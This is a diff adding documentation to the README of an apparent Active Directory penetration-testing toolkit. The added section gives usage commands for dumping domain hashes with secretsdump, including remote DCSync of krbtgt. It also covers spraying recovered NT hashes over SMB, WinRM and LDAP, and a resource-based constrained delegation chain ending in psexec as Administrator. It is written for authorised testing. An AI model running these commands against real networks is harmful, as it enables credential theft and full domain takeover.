@@ -31,6 +31,9 @@ It stitches together two well-known, freely available toolsets:
 | Writable objects (DACL analysis) | bloodyAD | `writable` |
 | AD-integrated DNS dump (ADIDNS) | bloodyAD | `dns` |
 | gMSA accounts & managed passwords | impacket LDAP + bloodyAD | `gmsa` |
+| Secrets dump: offline hives (LOCAL) or remote DCSync | impacket `secretsdump` | `secretsdump` |
+| Validate/spray recovered NT hashes (SMB/WinRM) | netexec | `pth-spray` |
+| Resource-based constrained delegation chain | impacket `addcomputer`/`rbcd`/`getST` | `rbcd` |
 | Full recon pass + report | all of the above | `all` |
 
 ### bloodyAD-style reads
@@ -61,6 +64,47 @@ Requires bloodyAD for `writable`/`dns`/`gmsa` password reads:
 `pipx install bloodyAD` ([project](https://github.com/CravateRouge/bloodyAD)).
 The `all` pass runs these automatically when bloodyAD is installed and
 credentials are supplied.
+
+### Credential dumping & movement (`secretsdump` / `pth-spray` / `rbcd`)
+
+Post-foothold steps for when enumeration has already yielded looted hives, a
+backup of `ntds.dit`, a set of recovered hashes, or write access over a computer
+object. These make **changes** on the target (especially `rbcd`) — authorised
+testing only. All support `--dry-run`.
+
+```bash
+# Dump hashes OFFLINE from registry hives / ntds.dit you downloaded from a share
+# (ntds.dit decryption needs the SYSTEM hive). Appends the LOCAL keyword for you.
+./ADEnumToolkit.py secretsdump -t 10.10.10.10 --system SYSTEM --security SECURITY
+./ADEnumToolkit.py secretsdump -t 10.10.10.10 --system SYSTEM --ntds ntds.dit
+
+# Dump REMOTELY (DCSync) with a replication-capable account or its hash
+./ADEnumToolkit.py secretsdump -t 10.10.10.10 -d corp.local -u admin -H :<nthash>
+./ADEnumToolkit.py secretsdump -t 10.10.10.10 -d corp.local -u admin -p pass --only-user krbtgt
+
+# Check which recovered hashes still authenticate (backups go stale). Pairs
+# user<->hash line-by-line; accepts a secretsdump dump file directly via --combo.
+./ADEnumToolkit.py pth-spray -t 10.10.10.10 -d corp.local --combo ntds.dump
+./ADEnumToolkit.py pth-spray -t 10.10.10.10 -d corp.local \
+    --userlist users.txt --hashlist hashes.txt --protocols smb winrm ldap
+
+# RBCD: create a computer, delegate it on the target, impersonate Administrator.
+# Needs write rights (GenericAll/WriteDACL) over the target computer object.
+./ADEnumToolkit.py rbcd -t 10.10.10.10 -d corp.local -u lowpriv -H :<nthash> \
+    --dc-host dc01.corp.local
+# ...then: export KRB5CCNAME=Administrator.ccache && psexec.py -k -no-pass dc01.corp.local
+# Undo the AD changes afterwards:
+./ADEnumToolkit.py rbcd -t 10.10.10.10 -d corp.local -u lowpriv -H :<nthash> \
+    --dc-host dc01.corp.local --cleanup
+```
+
+Notes:
+- A **machine account** hash from a backup hive is usually stale (computer
+  passwords auto-rotate ~monthly); `pth-spray` and the report flag this so you
+  don't waste time on it.
+- `rbcd` and the `psexec -k` that follows use **Kerberos**, so the DC FQDN must
+  resolve (add it to `/etc/hosts`) and your clock must be synced to the DC
+  (`sudo ntpdate <dc-ip>`), or you'll hit `KDC_ERR_PREAUTH_FAILED` / name errors.
 
 ### Vulnerability detection (`vulns`)
 
